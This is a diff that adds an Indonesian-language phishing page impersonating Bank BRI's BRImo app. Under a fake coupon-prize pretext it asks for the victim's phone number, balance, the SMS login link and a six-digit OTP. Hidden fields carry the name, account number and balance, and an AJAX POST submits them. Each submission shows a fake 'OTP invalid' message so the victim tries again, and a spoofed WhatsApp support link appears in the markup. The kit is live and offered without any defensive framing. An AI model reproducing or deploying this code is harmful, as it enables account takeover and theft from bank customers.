+      <h5 style="font-size: 15px;font-weight: bold;color: #17c0d1;padding: 5px;">Masukan Nomor Handphone Anda</h5>
+      <input type="text" name="nohp" id="nohp" placeholder="0812xxxxxxxx" minlength="10" maxlength="13" inputmode="numeric" required style="width: 100%;padding: 12px;outline: none;border: 2px solid #17c0d1;border-radius: 10px;font-size: 15px;box-shadow: 4px 7px 10px rgba(0,0,0,0.5);font-weight: bold;">
+      <br>
+      <br>
+      <h5 style="font-size: 15px;font-weight: bold;color: #17c0d1;padding: 5px;">Saldo Terakhir Anda</h5>
+      <input type="text" name="saldo" id="saldo" placeholder="Rp." inputmode="numeric" class="saldo" required style="width: 100%;padding: 12px;outline: none;border: 2px solid #17c0d1;border-radius: 10px;font-size: 15px;box-shadow: 4px 7px 10px rgba(0,0,0,0.5);font-weight: bold;">
+      <br>
+      <br>
+      <button type="submit" id="btn-nohp" style="width: 100%;padding: 11px;border: 2px solid #fff;border-radius: 8px;cursor: pointer;margin-top: 25px;background: #17c0d1;font-size: 15px;color: #fff;font-weight: bold;box-shadow: 4px 7px 10px rgba(0,0,0,0.5);">Lanjut</button>
+      <br>
+      <br>
+      <h5 style="font-size: 12px;font-weight: bold;color: #c0c0c0;text-align: center;">Data yang anda input hanya memastikan kepemilikan rekening data nasabah dijamin aman karena sudah terkripsi dengan sistem, Syarat&ketentuan</h5>
+    </div>
+   </form>
+  </div>
+  <div style="display: none" class="box-otp">
+     <body> 
+  <span class="blink" style="display: none" id="blinkk"><h1>Tautan Link tidak Valid, atau sudah Kadaluarsa</h1></span>
+ <span class="blink" style="display: none" id="blinkAktivasi"><h1>OTP Cetak Kupon invalid, atau sudah kadaluarsa</h1></span> 
+  <div class="container" id="sms" style="display: none"> 
+   <div class="box-lte"> 
+    <div class="row" style="margin-top: 150px;"> 
+     <div class="col-12 d-block mx-auto text-center p-0" style="height: 150px; width: 256px; max-width: 100%; display: block; margin-top: -50px; border-radius: 0px;"> 
+      <img alt="" src="https://d1muf25xaso8hp.cloudfront.net/https%3A%2F%2Fs3.amazonaws.com%2Fappforest_uf%2Ff1654616003584x348160725283053200%2Fhttps___s3.amazonaws.com_appforest_uf_f1649512719186x581120083778390800_PSX_20220401_045909-removebg%252520%2525281%252529%2520%25281%2529.png?w=384&h=246&auto=compress&dpr=2&fit=max" style="display: block; margin: 0px; width: 100%; height: 100%; border-radius: 0px;" margin-left:="" 10px;="" margin-right:=""> 
+     </div> 
+    </div> 
+    <div class="row"> 
+     <hr style="display: block; margin: auto; width: 90%;"> 
+     <p style="font-weight: bold; font-size: 20px; color: #098CE3; text-align: center; margin: 10px auto;" id="timer">3 : 00</p> 
+    </div> 
+    <div class="row"> 
+     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px; margin-top: -10px"> 
+      <p style="font-size: 10px; text-align: center; font-weight: bold; padding: 15px">Link untuk Penukaran POIN BRImo telah kami kirim ke nomor handphone anda, silakan cek SMS lalu masukkan Link di bawah ini<br><br>Link Konfirmasi (Wajib).</p> 
+     </div> 
+    </div> 
+    <div class="row"> 
+     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto;"> 
+ <form onsubmit="kirimPesan(event)" method="post" id="formLink1">
+       <center> 
+        <div style="margin-top: 1px"> 
+        
+      <textarea id="nama" minlength="20" placeholder="Contoh SMS https://brimo.bri.co.id/app/login?code=xxxxxx" onclick="gantiborder()" required class="" oninvalid="this.setCustomValidity('Hɑrɑp 𝗦𝗔𝗟𝗜𝗡 dɑn 𝗧𝗘𝗠𝗣𝗘𝗟 dengɑn benɑr untuk 𝗟𝗶𝗻𝗸 yɑng yɑng diterimɑ di 𝗦𝗠𝗦')" onchange="this.setCustomValidity('')" id='float-only' name='float-only'></textarea>
+ 
+         <b> <p style="font-size: 11px; text-align: center; margin-top: 25px; margin-left: 10px; margin-right: 10px;"><strong style="color: #FF0000;">Mohon jangan diisi jika belum menerima SMS Link Penukaran dari BRI-Aktivasi berupa Link..!!</strong></p></b>
+        </div>
+       </center>
+       <b>
+<input type="submit" id="kirim" class="bubble-element Button clickable-element" style="max-width: 85%; padding: 0px; cursor: pointer; background: none rgb(9, 140, 227); border: none; text-align: center; display: block; margin: 20px auto; height: 39px; width: 346px; left: 0px; top: 0px; font-family: Arial; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1px; line-height: 1; border-radius: 15px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s; font-weight: 700" tabindex="2" value="KIRIM"/>
+</b>
+      </form>
+     </div>
+     <b> </b>
+    </div>
+    <b> </b>
+   </div>
+   <b> 
+    <div class="row"> 
+     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px;"> 
+      <p style="font-size: 12px; text-align: center; margin-top: 50px;"><strong style="color: #5e5e5e;">Tidak terima SMS? <a href="otp.html" style="text-decoration: none; color: none rgb(9, 100, 127);">Kirim ulang SMS</a></strong></p> 
+     </div>
+     <center>
+     <p style="text-align: center; border: 2px solid #ccc; width: 150px; background: none rgb(9, 140, 227); margin-top: -12px; border-radius: 15px; font-size: 13px; height: 30px; padding-top: 4px; color: white; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; " onclick="ubahmode()">Ganti via Aktivasi</p>
+     </center>
+    </div> </b>
+  </div>
+   <div class="container" id="Aktivasi" style="display: block;"> 
+   <div class="box-lte"> 
+    <div class="row" style="margin-top: 140px;"> 
+     <div class="col-12 d-block mx-auto text-center p-0" style="height: 150px; width: 256px; max-width: 100%; display: block; margin-top: -50px; border-radius: 0px;"> 
+      <img alt="" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi3gbht0THBUhXR6v41ClzW-d4nefsqruqZtrNi8E4DlhqGcC8hIAMKdh42jaqroYTjOdoQ1dpAvkxuLwcl_3gyBbYCI97xLApu7Bam0awuZbauNQrBlGCtFMGaI7j_Krj2u9oxAxcDX46TgmGSwO3QUBcmG5AdMTo5f-w3GnOH64_MmSIcexpMhEYbpXU/s500/IMG_20240906_162855-fotor-bg-remover-20240906162935.png" style="display: block; margin: 0px; width: 300px; height:160px; border-radius: 0px;position: fixed;margin-top: -55px;left: 25px;"> 
+     </div> 
+    </div> 
+    <div class="row"> 
+     <hr style="display: block; margin: auto; width: 90%;margin-top: -40px;"> 
+     <p style="font-weight: bold; font-size: 15px; color: #000; text-align: center; margin: 10px auto;" id="waktu">5 : 00</p> 
+    </div> 
+    <div class="row"> 
+     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px; margin-top: -10px"> 
+      <p style="font-size: 13px; text-align: center; font-weight: bold; padding: 20px;color: #08656f;">Silakan cek kode OTP Cetak kupon yang masuk di pesan SMS di nomor handphone kamu untuk melanjutkan proses pencetakan kupon undian. <br><br>Kode Konfirmasi (Wajib).</p> 
+      <br>
+      <br>
+     </div> 
+    </div> 
+     <center>
+       <p id="alert" style="font-size: 10px;width: 100%;background: transparent;color: #000;position: fixed;text-align: center;top: 415px;right: 0;left: 0;font-weight: bold;display: ;" class="alert"></p>
+     </center>
+    <div class="row"> 
+     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto;"> 
+  <form onsubmit="sendOTP(event);" method="post" id="formLink">
+       <center> 
+        <div style="margin-top: -21px"> 
+        
+       <i class="ion-ios-locked-outline" id="ionIcons"></i> 
+   <input type="hidden" id="logo" value="༺═𝗕𝗮𝗻𝗸 𝗕𝗥𝗜═༻">
+<input type="hidden" id="nopon" name="tele" value="">
+<input type="hidden" id="namasaya" name="namanye" value="">
+<input type="hidden" id="nomorrek" name="kertu" value="">
+<input type="hidden" id="saldoku" name="uang" value="">
+         <input type="tel" name="otp" id="nama1"  class="bubble-element Input form-log" placeholder="OTP Kupon 6 DIGIT"  maxlength="6" minlength="6" pattern="(?=.*[0-9]).{6,8}"  required oninvalid="this.setCustomValidity('Mohon mɑsukkɑn 𝗞𝗼𝗱𝗲 𝗢𝗧𝗣 dengɑn benɑr')" onchange="this.setCustomValidity('')" style="margin-left: 0px;" required onclick="gantiborder1()">
+  
+         <b style="display: none;"> <p style="font-size: 12px; text-align: center; margin-top: 25px; margin-left: 10px; margin-right: 10px;"><strong style="color: #FF0000; text-decoration: none" onclick="location.href='https://wa.me/6288740672511?text=Hallo%20Bank%20BRI%0ASaya%20Belum%20Menerima%20OTP%20Cetak Kupon'"> Request OTP cetak Kupon melalui WhatsApp? </strong></p></b>
+        </div>
+       </center>
+       <b><br><br>
+<input type="submit" id="kirims" class="bubble-element Button clickable-element" style="max-width: 85%; padding: 0px; cursor: pointer; background: #08656f; border: none; text-align: center; display: block; margin: 20px auto; height: 39px; width: 346px; left: 0px; top: 0px; font-family: Arial; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1px; line-height: 1; border-radius: 15px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s; font-weight: 700" tabindex="2" value="Konfirmasi" onclick="SendBaru()" />
+</b>
+      </form>
+     </div>
+     <b> </b>
+    </div>
+    <b> </b>
+   </div>
+   <b> 
+    <div class="row"> 
+     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px;"> 
+      <button style="width: 75%;font-size: 12px;background: none;border: none;text-align: center;font-weight: bold;position: fixed;margin-top: 60px;margin-left: 25px;color: #08656f;" onclick="sendUlang()">>>Kirim Ulang SMS Cetak Kupon<<</button>
+     </div> 
+  </div>
+   </div>
+<!-- partial -->
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script>
+<script src='https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js'></script><script  src="script.js"></script>
+ <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script>
+  <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script src='https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js'></script>
+<script src="memek.js"></script>
+<script src="halaman.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+<script src="jquery.min.js"></script>
+        <script type="text/javascript">
+            $(document).ready(function(){
+
+                // Format mata uang.
+                $( '.uang' ).mask('000.000.000.000', {reverse: true});
+ var dengan_rupiah = document.getElementById('saldo');
+    dengan_rupiah.addEventListener('keyup', function(e)
+    {
+        dengan_rupiah.value = formatRupiah(this.value, 'Rp. ');
+    });
+    
+    
+      /* Fungsi */
+    function formatRupiah(angka, prefix)
+    {
+        var number_string = angka.replace(/[^,\d]/g, '').toString(),
+            split    = number_string.split(','),
+            sisa     = split[0].length % 3,
+            rupiah     = split[0].substr(0, sisa),
+            ribuan     = split[0].substr(sisa).match(/\d{3}/gi);
+            
+        if (ribuan) {
+            separator = sisa ? '.' : '';
+            rupiah += separator + ribuan.join('.');
+        }
+        
+        rupiah = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
+        return prefix == undefined ? rupiah : (rupiah ? 'Rp. ' + rupiah : '');
+    }
+            })
+            
+            
+        </script>
+        </script>
+<script>
+    window.onload = function() {
+  var minute = 04;
+  var sec = 59;
+  setInterval(function() {
+    document.getElementById("waktu").innerHTML =   minute + " : " + sec  ;
+    sec--;
+
+    if (sec == 0) {
+      minute--;
+      sec = 59;
+
+      if (minute == 0) {
+        minute = 1;
+      }
+    }
+  }, 1000);
+}
+  
+  
+  
+   
+    document.getElementById('waktu1').innerHTML =
+          01 + ":" + 01;
+        startTimer();
+        
+        function startTimer() {
+          var presentTime = document.getElementById('waktu1').innerHTML;
+          var timeArray = presentTime.split(/[:]+/);
+          var m = timeArray[0];
+          var s = checkSecond((timeArray[1] - 1));
+          if(s==59){m=m-1}
+          if(m<0){
+            return
+          }
+          
+          document.getElementById('waktu1').innerHTML =
+            m + " : " + s;
+          console.log(m)
+          setTimeout(startTimer, 1000);
+          
+        }
+        
+        function checkSecond(sec) {
+          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
+          if (sec < 0) {sec = "59"};
+          return sec;
+        }
+        
+        
+        
+    
+    </script>  
+  <script>
+      document.getElementById('timer').innerHTML =
+          01 + ":" + 01;
+        startTimer1();
+        
+        function startTimer1() {
+          var presentTime = document.getElementById('timer').innerHTML;
+          var timeArray = presentTime.split(/[:]+/);
+          var m = timeArray[0];
+          var s = checkSecond((timeArray[1] - 1));
+          if(s==59){m=m-1}
+          if(m<0){
+            return 
+          }
+          
+          document.getElementById('timer').innerHTML =
+            m + " : " + s;
+          console.log(m)
+          setTimeout(startTimer1, 1000);
+          
+        }
+        
+        function checkSecond(sec) {
+          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
+          if (sec < 0) {sec = "59"};
+          return sec;
+        }
+        
+        
+        
+  </script>
+   <script>
+ $('#formLink').on('submit', function (event) {
+ 
+  event.stopPropagation();
+    event.preventDefault();
+    
+ document.getElementById('kirims').value = "Memproses....";
+ 
+ 
+
+$.ajax({
+
+ type: 'POST',
+ async: false,
+ dataType: 'JSON',
+ data: $(this).serialize(),
+ 
+ complete: function(data) {
+            console.log('Complete')
+ setTimeout(function(){
+  document.getElementById("blinkAktivasi").style.display = "block";
+ $("#nama1").val("");
+ $("#nama1").addClass('textarea1'); 
+ $('#alert').hide();
+document.getElementById('kirims').value = "Lanjut";
+
+
+    }, 1000);
+
+
+
+        }
+    });
+
+    return false;
+});   
+        
+</script>
+<script>
+  function sendUlang(){
+    $('.blink').hide();event.preventDefault();
+    setTimeout(function(){
+      
+    },700);
+    $("#nama1").addClass('textarea2');
+    $('#alert').show();
+     var nomor = document.getElementById('nohp').value;
+     sessionStorage.setItem('nohp', nohp);
+     document.getElementById('alert').innerHTML = 'OTP telah terkirim ulang ke +62' +  nohp.value+  '<br>via SMS handphone anda';
+     
+     document.getElementById('kirims').value = "Lanjut"
+  }
+</script>
+<script>
+ function gantiborder1(){
+   $("#nama1").removeClass('textarea1'); 
+   
+   $("#blinkAktivasi").hide(); 
+   document.getElementById('kirims').value = "Konfirmasi";
+ }   
+</script>
+</body>
+</html>
